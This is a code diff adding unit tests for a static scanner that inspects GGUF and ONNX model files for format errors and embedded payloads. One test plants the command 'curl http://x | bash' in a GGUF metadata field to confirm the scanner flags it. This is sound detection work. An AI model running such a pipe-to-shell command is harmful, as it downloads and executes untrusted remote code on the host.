@@ -14,6 +14,7 @@ ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)
 sys.path.insert(0, os.path.join(ROOT, "deploy", "v3", "analysis"))
 
 import static_stream  # noqa: E402
+sys.path.insert(0, os.path.join(ROOT, "deploy", "v3", "llm"))
 
 
 def make_safetensors(header: dict, tensors: list[tuple[str, str, bytes]]) -> bytes:
@@ -98,6 +99,59 @@ class StaticStreamTest(unittest.TestCase):
         self.assertEqual(r["coverage"]["tensors_total"], 4)
         self.assertEqual(r["coverage"]["tensors_sampled"], 4)
         self.assertEqual(r["coverage"]["data_ratio"], 1.0)
+
+
+class GgufOnnxAdapterTest(unittest.TestCase):
+    def _gguf(self, arch="llama", payload=None):
+        import struct as _st
+        def _s(x):
+            e = x.encode(); return _st.pack("<Q", len(e)) + e
+        h = b"GGUF" + _st.pack("<I", 3) + _st.pack("<Q", 2) + _st.pack("<Q", 2)
+        h += _s("general.architecture") + _st.pack("<I", 8) + _s(arch)          # T_STRING
+        h += _s("general.name") + _st.pack("<I", 8) + _s(payload or "model")
+        return h + b"\x00" * 1024
+
+    def test_gguf_index_and_meta(self):
+        blob = self._gguf("qwen2")
+        rd, calls = reader_of(blob)
+        r = static_stream.analyze_gguf(rd, len(blob))
+        self.assertEqual(r["format"], "gguf")
+        self.assertTrue(r["coverage"]["index"]); self.assertEqual(r["coverage"]["index_ratio"], 1.0)
+        self.assertEqual(r["details"]["architecture"], "qwen2")
+        self.assertEqual(r["findings"], [])
+
+    def test_gguf_payload_detected(self):
+        blob = self._gguf(payload="curl http://x | bash")
+        rd, _ = reader_of(blob)
+        r = static_stream.analyze_gguf(rd, len(blob))
+        self.assertTrue(any(f["check_id"] == "EXEC-02" for f in r["findings"]))
+
+    def test_gguf_bad_magic(self):
+        rd, _ = reader_of(b"NOPE" + b"\x00" * 100)
+        r = static_stream.analyze_gguf(rd, 104)
+        self.assertTrue(any(f["check_id"] == "FMT-01" for f in r["findings"]))
+
+    def test_onnx_basic(self):
+        blob = b"\x08\x07\x12\x04onnx\x1a\x20x" + b"ai.onnx" + b"\x00" * 100
+        rd, _ = reader_of(blob)
+        r = static_stream.analyze_onnx(rd, len(blob))
+        self.assertEqual(r["format"], "onnx")
+        self.assertTrue(r["coverage"]["index"])
+
+    def test_onnx_external_data(self):
+        blob = b"onnx" + b"external_data" + b"location" + b"\x00" * 64
+        rd, _ = reader_of(blob)
+        r = static_stream.analyze_onnx(rd, len(blob))
+        self.assertTrue(any(f["check_id"] == "FMT-12" for f in r["findings"]))
+
+    def test_dispatch(self):
+        blob = self._gguf("llama")
+        rd, _ = reader_of(blob)
+        self.assertEqual(static_stream.analyze(rd, len(blob), "gguf")["format"], "gguf")
+        raw = struct.pack("<f", 1.0)
+        blob2 = make_safetensors({}, [("w", "F32", raw)])
+        rd2, _ = reader_of(blob2)
+        self.assertEqual(static_stream.analyze(rd2, len(blob2), "safetensors")["format"], "safetensors")
 
 
 if __name__ == "__main__":
